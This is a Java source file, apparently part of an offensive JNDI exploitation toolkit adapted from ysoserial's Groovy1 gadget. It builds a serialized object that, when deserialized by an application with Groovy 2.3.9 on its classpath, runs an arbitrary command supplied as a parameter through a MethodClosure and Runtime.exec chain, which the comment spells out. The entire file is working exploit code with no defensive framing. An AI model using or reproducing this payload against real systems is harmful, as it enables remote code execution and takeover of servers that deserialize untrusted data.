package com.nu1r.jndi.gadgets;

import com.nu1r.jndi.enumtypes.PayloadType;
import com.nu1r.jndi.gadgets.annotation.Authors;
import com.nu1r.jndi.gadgets.annotation.Dependencies;
import com.nu1r.jndi.gadgets.utils.Gadgets;
import org.codehaus.groovy.runtime.ConvertedClosure;
import org.codehaus.groovy.runtime.MethodClosure;

import java.lang.reflect.InvocationHandler;
import java.util.Map;

/**
 * Gadget chain:
 * 		ObjectInputStream.readObject()
 * 			PriorityQueue.readObject()
 * 				Comparator.compare() (Proxy)
 * 					ConvertedClosure.invoke()
 * 						MethodClosure.call()
 * 							...
 * 						  		Method.invoke()
 * 									Runtime.exec()
 *
 * 	Requires:
 * 		groovy
 */
@Dependencies({"org.codehaus.groovy:groovy:2.3.9"})
@Authors({Authors.FROHOFF})
public class Groovy1 implements ObjectPayload<InvocationHandler> {

    public InvocationHandler getObject(PayloadType type, String... param) throws Exception {
        String                  command = param[0];
        final ConvertedClosure closure = new ConvertedClosure(new MethodClosure(command, "execute"), "entrySet");

        final Map map = Gadgets.createProxy(closure, Map.class);

        final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(map);

        return handler;
    }
}
